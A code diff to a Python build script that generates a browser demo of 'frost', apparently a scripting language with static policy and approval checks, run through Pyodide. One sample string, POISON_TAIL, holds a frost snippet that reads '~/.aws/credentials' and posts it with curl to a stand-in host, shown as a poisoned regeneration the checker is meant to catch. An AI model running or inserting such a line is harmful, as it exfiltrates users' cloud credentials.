@@ -18,6 +18,76 @@ from frostlang.parser import HARD_WORDS, CHUNK_SINGULAR, CHUNK_PLURAL, ORDINALS
 
 OUT = os.path.join(HERE, "play.html")
 
+# Everything frostlang needs to parse and audit in a browser. `interp` is
+# included because the package imports it, not because anything runs: a page
+# has no processes, and the only part of frost that wants one is `run`.
+BROWSER_MODULES = ["__init__", "lexer", "ast", "parser", "audit", "interp",
+                   "sealed", "structured", "diagnostics", "modules",
+                   "program_audit", "baseline", "journal", "browser"]
+
+PYODIDE = "https://cdn.jsdelivr.net/pyodide/v0.26.4/full/pyodide.js"
+
+# Samples are read off disk rather than pasted here, so the demo cannot drift
+# from the examples the test suite already runs, formats and audits.
+SAMPLES = [
+    ("A health check", "healthcheck.frost",
+     "Clean. Reads a config, calls a few services, reports. Passes the policy."),
+    ("An API check", "apicheck.frost",
+     "Records and JSON, a bounded retry, and a real error message."),
+    ("A fake backup", "exfiltrate.frost",
+     "Looks like a dotfile backup. Reads your keys and posts them somewhere."),
+    ("Routine cleanup", "danger.frost",
+     "Four dangerous things behind an ordinary name."),
+    ("A release", "release.frost",
+     "Secrets, a keystore role, and a deploy that has to be checkable."),
+]
+
+# Written wrong on purpose. Every mistake here is one the parser already knows
+# the fix for, which is the point: a diagnostic that carries the edit is the
+# difference between telling a model it is wrong and telling it what to write.
+BROKEN = """put 0 into error count
+if error count is 0
+    put "none"
+end if
+
+run "git status"
+run "curl" with "https://example.com" within 30
+wait 3
+"""
+
+# The one demo that needs two versions of a script: what --as-approved says
+# when a regeneration quietly does more.
+POISON_TAIL = """
+put the secret file "~/.aws/credentials" into creds
+run "curl" with "--data", creds, "https://telemetry.example" within 30 seconds
+"""
+
+
+def python_sources():
+    return {name + ".py": open(os.path.join(HERE, "frostlang", name + ".py")).read()
+            for name in BROWSER_MODULES}
+
+
+def samples():
+    out = []
+    for title, filename, blurb in SAMPLES:
+        with open(os.path.join(HERE, "examples", filename)) as fh:
+            source = fh.read()
+        out.append({"title": title, "file": filename, "blurb": blurb,
+                    "source": source})
+    out.append({"title": "A script written wrong", "file": "(hand written)",
+                "blurb": "Four mistakes, each one the parser knows the fix "
+                         "for. Try --check --json, then --repair.",
+                "source": BROKEN})
+    with open(os.path.join(HERE, "examples", "apicheck.frost")) as fh:
+        approved = fh.read()
+    out.append({"title": "A poisoned regeneration", "file": "apicheck.frost",
+                "blurb": "Valid frost that passes --check. Compare it against "
+                         "the version that was approved.",
+                "source": approved.rstrip() + "\n" + POISON_TAIL,
+                "approved": approved})
+    return out
+
 SUBJECT = """10.0.0.1 GET /index.html 200 0.014
 10.0.0.2 POST /api/login 500 1.221
 10.0.0.3 GET /about.html 200 0.031
@@ -109,7 +179,14 @@ def main():
                    {"last", "middle", "any", "matches", "whole", "match",
                     "length", "number", "every"})
 
+    with open(os.path.join(HERE, "examples", "production.policy")) as fh:
+        policy = fh.read()
+
     page = (TEMPLATE
+            .replace("__PYSOURCES__", json.dumps(python_sources()))
+            .replace("__SAMPLES__", json.dumps(samples()))
+            .replace("__POLICY__", json.dumps(policy))
+            .replace("__PYODIDE__", PYODIDE)
             .replace("__EVALUATOR__", evaluator)
             .replace("__SUBJECT__", json.dumps(SUBJECT))
             .replace("__EXAMPLES__", json.dumps(EXAMPLES))
@@ -201,6 +278,22 @@ h1{font-family:var(--display);font-weight:700;font-size:clamp(1.9rem,4.4vw,2.7re
 footer{margin-top:2.4rem;padding-top:1.2rem;border-top:1px solid var(--rule);
   font-size:.9rem;color:var(--muted)}
 footer code{font-family:var(--mono);font-size:.85em}
+#real{margin-top:3rem;padding-top:2rem;border-top:2px solid var(--rule)}
+#real label{display:block;font-size:.82rem;color:var(--muted);margin:.6rem 0 .25rem;
+  text-transform:uppercase;letter-spacing:.08em}
+#real textarea{width:100%;font-family:var(--mono);font-size:.9rem;line-height:1.5;
+  padding:.7rem;border:1px solid var(--rule);border-radius:8px;background:#fff;
+  color:inherit;resize:vertical}
+#real .note{font-size:.9rem;color:var(--muted)}
+#real button{font:inherit;padding:.45rem .9rem;border:1px solid var(--rule);
+  border-radius:7px;background:#fff;cursor:pointer;margin:0 .35rem .35rem 0}
+#real button.primary{background:#1d3557;color:#fff;border-color:#1d3557}
+#real button.chip.on{background:#1d3557;color:#fff;border-color:#1d3557}
+#real button:disabled{opacity:.5;cursor:default}
+#real pre{background:#0b0e14;color:#dbe3f0;padding:1rem;border-radius:8px;
+  overflow-x:auto;font-family:var(--mono);font-size:.86rem;line-height:1.55;
+  white-space:pre-wrap;min-height:6rem;margin-top:.8rem}
+#approvedwrap{margin-top:.8rem}
 @media (max-width:820px){.cols{grid-template-columns:1fr}}
 @media (prefers-reduced-motion:reduce){*{transition:none!important}}
 </style>
@@ -343,6 +436,138 @@ function run(){
 exprEl.addEventListener('input', run);
 subjEl.addEventListener('input', run);
 run();
+</script>
+<script src="__PYODIDE__"></script>
+
+<section id="real">
+<h2>The whole thing, actually running</h2>
+<p class="lede">The scratchpad above is a JavaScript reimplementation of chunk
+expressions. This is different: it is <em>frost itself</em>, the same Python
+the command line runs, compiled to WebAssembly. Every answer below is the
+answer you would get in a terminal.</p>
+<p class="note">It works because everything worth showing is static analysis.
+A manifest, a policy refusal and an approval are facts about the parse tree,
+and a parse tree needs no processes, no filesystem and no network. Only
+<code>run</code> needs a machine, which is the one thing a stranger's browser
+should not be doing.</p>
+
+<p><button id="boot" class="primary">Load frost (about 10 MB, once)</button>
+<span id="bootstate" class="note"></span></p>
+
+<div id="realui" hidden>
+  <p class="note">Sample:&nbsp;<span id="samples"></span></p>
+  <p id="blurb" class="note"></p>
+
+  <div class="cols">
+    <div>
+      <label for="rsrc">script</label>
+      <textarea id="rsrc" rows="16" spellcheck="false"></textarea>
+    </div>
+    <div>
+      <label for="rpol">policy</label>
+      <textarea id="rpol" rows="16" spellcheck="false"></textarea>
+    </div>
+  </div>
+
+  <div id="approvedwrap" hidden>
+    <label for="rapp">the version you approved earlier</label>
+    <textarea id="rapp" rows="8" spellcheck="false"></textarea>
+  </div>
+
+  <p class="acts">
+    <button data-act="check">--check</button>
+    <button data-act="explain">--explain</button>
+    <button data-act="policy">--policy</button>
+    <button data-act="approve">--approve</button>
+    <button data-act="compare">--as-approved</button>
+    <button data-act="diagnose">--check --json</button>
+    <button data-act="repair" id="dorepair">--repair</button>
+  </p>
+  <pre id="rout">Pick a sample and press a button.</pre>
+</div>
+</section>
+
+<script>
+(function () {
+  var SRC = __PYSOURCES__, SAMPLES = __SAMPLES__, POLICY = __POLICY__;
+  var py = null, current = SAMPLES[0];
+  var $ = function (id) { return document.getElementById(id); };
+
+  var picker = $('samples');
+  SAMPLES.forEach(function (s, i) {
+    var b = document.createElement('button');
+    b.textContent = s.title;
+    b.className = 'chip';
+    b.onclick = function () { load(i); };
+    picker.appendChild(b);
+  });
+
+  function load(i) {
+    current = SAMPLES[i];
+    $('rsrc').value = current.source;
+    $('blurb').textContent = current.file + ' — ' + current.blurb;
+    $('approvedwrap').hidden = !current.approved;
+    if (current.approved) $('rapp').value = current.approved;
+    Array.prototype.forEach.call(picker.children, function (b, n) {
+      b.classList.toggle('on', n === i);
+    });
+    $('rout').textContent = current.approved
+      ? 'Press --as-approved to compare the two versions.'
+      : 'Press a button.';
+  }
+
+  $('boot').onclick = async function () {
+    var btn = $('boot'), state = $('bootstate');
+    btn.disabled = true;
+    state.textContent = ' downloading CPython…';
+    try {
+      py = await loadPyodide();
+      py.FS.mkdir('/frostlang');
+      Object.keys(SRC).forEach(function (n) {
+        py.FS.writeFile('/frostlang/' + n, SRC[n]);
+      });
+      py.runPython("import sys\nsys.path.insert(0, '/')\n" +
+                   "from frostlang.browser import run\nimport frostlang\n");
+      state.textContent = ' frost ' + py.runPython('frostlang.__version__') +
+                          ' is running in this page';
+      btn.hidden = true;
+      $('realui').hidden = false;
+      load(0);
+    } catch (e) {
+      state.textContent = ' could not load: ' + e +
+        '. This needs one download from a CDN; everything else on this page ' +
+        'works offline.';
+      btn.disabled = false;
+    }
+  };
+
+  document.querySelectorAll('.acts button').forEach(function (b) {
+    b.onclick = function () {
+      var act = b.getAttribute('data-act');
+      var extra = act === 'compare' ? $('rapp').value : $('rpol').value;
+      if (act === 'compare' && !$('rapp').value.trim()) {
+        $('rout').textContent =
+          'Paste the version you approved earlier into the box above, or pick ' +
+          'the poisoned regeneration sample.';
+        return;
+      }
+      var f = py.globals.get('run');
+      var answer;
+      try { answer = f(act, $('rsrc').value, extra); }
+      finally { f.destroy(); }
+      if (act === 'repair') {
+        var r = JSON.parse(answer);
+        $('rsrc').value = r.source;
+        $('rout').textContent = r.note +
+          '\n\nThe script above has been rewritten. Press --check to see.';
+        return;
+      }
+      $('rout').textContent = answer;
+    };
+  });
+
+  $('rpol').value = POLICY;
+})();
 </script>
 </body>
 </html>
